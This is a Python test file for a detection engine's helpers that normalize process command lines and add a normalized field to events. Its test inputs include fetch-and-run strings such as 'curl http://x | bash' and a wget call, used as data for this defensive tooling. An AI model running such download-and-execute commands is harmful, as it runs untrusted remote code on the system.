"""
test_normalization.py — command-line canonicalization helpers.
"""
from app.detection.engine.normalization import (
    enrich_process_fields,
    normalize_command_line,
)


def test_collapses_whitespace_runs():
    assert normalize_command_line("curl   http://x    |   bash") == "curl http://x | bash"


def test_strips_tabs_and_newlines():
    assert normalize_command_line("bash\t-c\n'id'") == "bash -c 'id'"


def test_removes_null_bytes():
    assert normalize_command_line("wget\x00http://x") == "wget http://x"


def test_empty_and_none_safe():
    assert normalize_command_line("") == ""
    assert normalize_command_line(None) == ""


def test_case_is_preserved():
    assert normalize_command_line("Curl HTTP://X") == "Curl HTTP://X"


def test_enrich_adds_normalized_command_and_preserves_raw():
    raw = "curl   http://x   |   bash"
    event = {"process": {"command_line": raw}}
    enrich_process_fields(event)
    assert event["process"]["command_line"] == raw           # untouched
    assert event["process"]["normalized_command"] == "curl http://x | bash"


def test_enrich_is_safe_without_process():
    event = {"message": "x"}
    # Must not raise and must not invent a process block.
    assert enrich_process_fields(event) is event
    assert "process" not in event


def test_enrich_safe_when_command_line_absent():
    event = {"process": {"name": "bash"}}
    enrich_process_fields(event)
    assert "normalized_command" not in event["process"]
